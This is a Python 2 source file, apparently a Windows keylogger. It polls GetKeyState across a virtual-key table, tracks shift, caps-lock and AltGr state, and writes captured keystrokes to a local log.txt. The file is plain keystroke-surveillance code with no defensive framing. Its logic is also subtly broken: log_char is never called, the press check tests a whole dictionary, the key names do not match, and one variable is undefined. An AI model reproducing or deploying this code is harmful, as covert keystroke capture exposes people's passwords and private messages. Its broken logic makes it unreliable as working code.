"""
Created on 07-03-2016

@author: sceptross
"""

import win32api
import time
import ctypes

VK_CODE = {'backspace': 0x08,
           'tab': 0x09,
           'clear': 0x0C,
           'enter': 0x0D,
           'pause': 0x13,
           'caps_lock': 0x14,
           'esc': 0x1B,
           'spacebar': 0x20,
           'page_up': 0x21,
           'page_down': 0x22,
           'end': 0x23,
           'home': 0x24,
           'left_arrow': 0x25,
           'up_arrow': 0x26,
           'right_arrow': 0x27,
           'down_arrow': 0x28,
           'select': 0x29,
           'print': 0x2A,
           'execute': 0x2B,
           'print_screen': 0x2C,
           'ins': 0x2D,
           'del': 0x2E,
           'help': 0x2F,
           '0': 0x30,
           '1': 0x31,
           '2': 0x32,
           '3': 0x33,
           '4': 0x34,
           '5': 0x35,
           '6': 0x36,
           '7': 0x37,
           '8': 0x38,
           '9': 0x39,
           'a': 0x41,
           'b': 0x42,
           'c': 0x43,
           'd': 0x44,
           'e': 0x45,
           'f': 0x46,
           'g': 0x47,
           'h': 0x48,
           'i': 0x49,
           'j': 0x4A,
           'k': 0x4B,
           'l': 0x4C,
           'm': 0x4D,
           'n': 0x4E,
           'o': 0x4F,
           'p': 0x50,
           'q': 0x51,
           'r': 0x52,
           's': 0x53,
           't': 0x54,
           'u': 0x55,
           'v': 0x56,
           'w': 0x57,
           'x': 0x58,
           'y': 0x59,
           'z': 0x5A,
           'numpad_0': 0x60,
           'numpad_1': 0x61,
           'numpad_2': 0x62,
           'numpad_3': 0x63,
           'numpad_4': 0x64,
           'numpad_5': 0x65,
           'numpad_6': 0x66,
           'numpad_7': 0x67,
           'numpad_8': 0x68,
           'numpad_9': 0x69,
           'multiply_key': 0x6A,
           'add_key': 0x6B,
           'separator_key': 0x6C,
           'subtract_key': 0x6D,
           'decimal_key': 0x6E,
           'divide_key': 0x6F,
           'F1': 0x70,
           'F2': 0x71,
           'F3': 0x72,
           'F4': 0x73,
           'F5': 0x74,
           'F6': 0x75,
           'F7': 0x76,
           'F8': 0x77,
           'F9': 0x78,
           'F10': 0x79,
           'F11': 0x7A,
           'F12': 0x7B,
           'F13': 0x7C,
           'F14': 0x7D,
           'F15': 0x7E,
           'F16': 0x7F,
           'F17': 0x80,
           'F18': 0x81,
           'F19': 0x82,
           'F20': 0x83,
           'F21': 0x84,
           'F22': 0x85,
           'F23': 0x86,
           'F24': 0x87,
           'num_lock': 0x90,
           'scroll_lock': 0x91,
           'left_shift': 0xA0,
           'right_shift ': 0xA1,
           'left_control': 0xA2,
           'right_control': 0xA3,
           'left_menu': 0xA4,
           'right_menu': 0xA5,
           'browser_back': 0xA6,
           'browser_forward': 0xA7,
           'browser_refresh': 0xA8,
           'browser_stop': 0xA9,
           'browser_search': 0xAA,
           'browser_favorites': 0xAB,
           'browser_start_and_home': 0xAC,
           'volume_mute': 0xAD,
           'volume_Down': 0xAE,
           'volume_up': 0xAF,
           'next_track': 0xB0,
           'previous_track': 0xB1,
           'stop_media': 0xB2,
           'play/pause_media': 0xB3,
           'start_mail': 0xB4,
           'select_media': 0xB5,
           'start_application_1': 0xB6,
           'start_application_2': 0xB7,
           'attn_key': 0xF6,
           'crsel_key': 0xF7,
           'exsel_key': 0xF8,
           'play_key': 0xFA,
           'zoom_key': 0xFB,
           'clear_key': 0xFE,
           '+': 0xBB,
           ',': 0xBC,
           '-': 0xBD,
           '.': 0xBE,
           '~': 0xBF,
           '`': 0xC0,
           "'": 0xDB,
           '\\': 0xDC,
           '<': 0xE2,
           }

printable_nonalphanumeric = ['+', ',', '-', '.', '~', "'", '\\', '<']
shift_printable_nonalphanumeric = {
                                   '+': '*',
                                   ',': ';',
                                   '-': '_',
                                   '.': ':',
                                   "'": '?',
                                   '\\': '|',
                                   '<': '>'
                                   }
shift_printable_numeric = ['=', '!', '"', '#', '$', '%', '&', '/', '(', ')']
alt_gr_numeric = ['}', '', '@', '', '', '', '', '{', '[', ']']
keysPressed = {}
wasKeyPressedTheLastTimeWeChecked = {}
log_file = open('log.txt', 'w')
keysDown = []
locks_state = {'caps_lock': False,
               'num_lock': False,
               'scroll_lock': False}


def key_was_unpressed(k):
    keysDown.remove(k)


def key_was_pressed(k):
    global string
    keysDown.append(k)
    if is_alphanumeric(k):
        log_file.write(k)


def is_key_pressed(k):
    # if the high-order bit is 1, the key is down; otherwise, it is up
    return (win32api.GetKeyState(k) & (1 << 7)) != 0


def is_alphanumeric(k):
    if len(k) != 1:
        return False
    return (0x30 <= ord(k) <= 0x39) or (0x61 <= ord(k) <= 0x7a)


def is_alpha(k):
    if len(k) != 1:
        return False
    return 0x61 <= ord(k) <= 0x7a


def is_numeric(k):
    if len(k) != 1:
        return False
    return 0x30 <= ord(k) <= 0x39


def is_numlock_key(k):
    if len(k) != 1:
        return False
    return 0x60 <= ord(k) <= 0x6F


# Queries the Windows API to know which of the lock keys are turned on
def set_locks_state():
    hlldll = ctypes.WinDLL("User32.dll")
    locks_state['caps_lock'] = bool(hlldll.GetKeyState(0x14))
    locks_state['num_lock'] = bool(hlldll.GetKeyState(0x90))
    locks_state['scroll_lock'] = bool(hlldll.GetKeyState(0x91))


def log_char(k):
    ctrl = ['left_control', 'right_control']
    alt = ['left_alt', 'right_alt']

    # Check if alt gr / ctrl + alt is pressed
    altgr = 'right_alt' in keysDown
    if not altgr:
        for k in ctrl:
            if k in keysDown:
                for l in alt:
                    if l in keysDown:
                        altgr = True
    if altgr and is_numeric(k):
        log_file.write(alt_gr_numeric[k])
        return

    # If ctrl / alt is pressed, nothing is typed, so it's useless to go on
    for k in (ctrl + alt):
        if k in keysDown:
            return

    if k == 'spacebar':
        log_file.write(' ')
        return
    elif k == 'enter':
        log_file.write('\n')
        return
    elif k == 'del':
        log_file.write('[del]')
        return
    elif k == 'backspace':
        log_file.write('[backspace]')
        return

    # Check num lock keys
    if locks_state['num_lock'] and is_numlock_key(k):
        num_lock_keys = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '*', '+', '.', '-', ',', '/']
        log_file.write(num_lock_keys[VK_CODE[k] - 0x60])
        return

    # Count the number of shift keys pressed to know what was typed
    shift_state = 0
    if 'shift_left' in keysDown:
        shift_state += 1
    if 'shift_right' in keysDown:
        shift_state += 1

    if is_alpha(k):
        if locks_state['caps_lock']:
            shift_state += 1
        if shift_state % 2 == 1:
            log_file.write(k.upper())
        else:
            log_file.write(k.lower())
    elif is_numeric(k):
        if shift_state % 2 == 1:
            log_file.write(shift_printable_numeric[int(k)])
        else:
            log_file.write(k)
    elif k in printable_nonalphanumeric:
        if shift_state % 2 == 1:
            log_file.write(shift_printable_nonalphanumeric[k])
        else:
            log_file.write(k)


def init():
    set_locks_state()
    for key in VK_CODE:
        keysPressed[key] = False
        wasKeyPressedTheLastTimeWeChecked[key] = False


def main():
    init()
    while True:
        try:
            for k in VK_CODE:
                key_is_pressed = is_key_pressed(VK_CODE[k])
                if key_is_pressed and not wasKeyPressedTheLastTimeWeChecked:
                    key_was_pressed(k)
                    keysPressed[k] = True
                    if k == 'caps_lock' or k == 'num_lock' or k == 'scroll_lock':
                        locks_state[k] = not locks_state[k]
                if not key_is_pressed and wasKeyPressedTheLastTimeWeChecked[k]:
                    key_was_unpressed(k)
                    keysPressed[k] = False
                    wasKeyPressedTheLastTimeWeChecked[k] = key_is_pressed
            time.sleep(0.01)
        except KeyboardInterrupt:
            log_file.close()
            print string
            quit()

main()
